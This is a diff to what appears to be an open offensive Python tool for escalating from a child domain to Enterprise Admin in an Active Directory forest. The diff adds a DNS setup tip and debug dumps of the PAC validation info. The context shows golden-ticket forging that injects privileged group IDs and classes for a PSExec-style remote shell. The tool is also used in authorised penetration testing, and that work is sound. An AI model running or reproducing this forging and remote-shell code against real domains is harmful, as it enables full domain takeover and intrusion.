@@ -38,7 +38,7 @@
 #           3) PSExec Shell with Enterprise Admin privileges at target-exec parameter.
 #
 #   IMPORTANT NOTE: Your machine MUST be able to resolve all the domains from the child domain up to the
-#                   forest.
+#                   forest. Easiest way to do is by adding the forest's DNS to your resolv.conf or similar
 #
 #   E.G:
 #   Just in case, Microsoft says it all (https://technet.microsoft.com/en-us/library/cc759073(v=ws.10).aspx):
@@ -492,7 +492,6 @@ class Pipes(Thread):
         except Exception, e:
             logging.critical("Something wen't wrong connecting the pipes(%s), try again" % self.__class__)
 
-
 class RemoteStdOutPipe(Pipes):
     def __init__(self, transport, pipe, permisssions):
         Pipes.__init__(self, transport, pipe, permisssions)
@@ -639,7 +638,6 @@ class RemoteShell(cmd.Cmd):
             LastDataSent = ''
         self.server.writeFile(self.tid, self.fid, data)
 
-
 class RemoteStdInPipe(Pipes):
     def __init__(self, transport, pipe, permisssions, TGS=None, share=None):
         Pipes.__init__(self, transport, pipe, permisssions, TGS, share)
@@ -648,7 +646,6 @@ class RemoteStdInPipe(Pipes):
         self.connectPipe()
         shell = RemoteShell(self.server, self.port, self.credentials, self.tid, self.fid, self.TGS, self.share)
         shell.cmdloop()
-
 
 class RAISECHILD:
     def __init__(self, target = None, username = '', password = '', domain='', options = None, command=''):
@@ -1077,6 +1074,11 @@ class RAISECHILD:
             lenVal = len(validationInfo.getData())
             validationInfo.fromStringReferents(data[lenVal:], lenVal)
 
+            if logging.getLogger().level == logging.DEBUG:
+                logging.debug('VALIDATION_INFO before making it gold')
+                validationInfo.dump()
+                print ('\n')
+
             # Our Golden Well-known groups! :)
             groups = (513, 512, 520, 518, 519)
             validationInfo['Data']['GroupIds'] = list()
@@ -1111,6 +1113,11 @@ class RAISECHILD:
 
             validationInfoBlob = validationInfo.getData()+validationInfo.getDataReferents()
             validationInfoAlignment = '\x00'*(((len(validationInfoBlob)+7)/8*8)-len(validationInfoBlob))
+
+            if logging.getLogger().level == logging.DEBUG:
+                logging.debug('VALIDATION_INFO after making it gold')
+                validationInfo.dump()
+                print ('\n')
         else:
             raise Exception('PAC_LOGON_INFO not found! Aborting')
 
